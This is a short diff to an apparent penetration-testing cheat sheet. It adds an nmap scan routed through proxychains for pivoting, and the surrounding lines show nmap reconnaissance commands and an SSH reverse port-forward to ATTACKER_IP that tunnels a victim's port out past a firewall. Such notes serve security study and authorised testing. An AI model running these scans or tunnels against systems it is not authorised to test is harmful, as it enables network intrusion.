@@ -17,6 +17,10 @@ nmap -sU --top-ports 500 --open -T5 -v -n IP
 ```
 nmap -sCV -p- -sS --min-rate 5000 --open -vvv -n -Pn IP -sY
 ```
+#### Pivoting scan
+```
+proxychains nmap -sT -p- -sV -Pn -T5 -v -n --open IP
+```
 #### Vuln
 ```
 nmap -sV -p PORTS --script vuln IP -oN nmap
@@ -82,7 +86,7 @@ Remort Port Forwarding (Firewall)
 ```
 ssh -N -R ATTACKER_IP:ATTACKER_PORT(listener):VICTIM_IP:VICTIM_PORT attackeruser@attackerip
 ```
-### Pivoting (nmap must have -sT parameter if you want to scan ports with proxychains)
+### Pivoting
 
 #### SSH
 
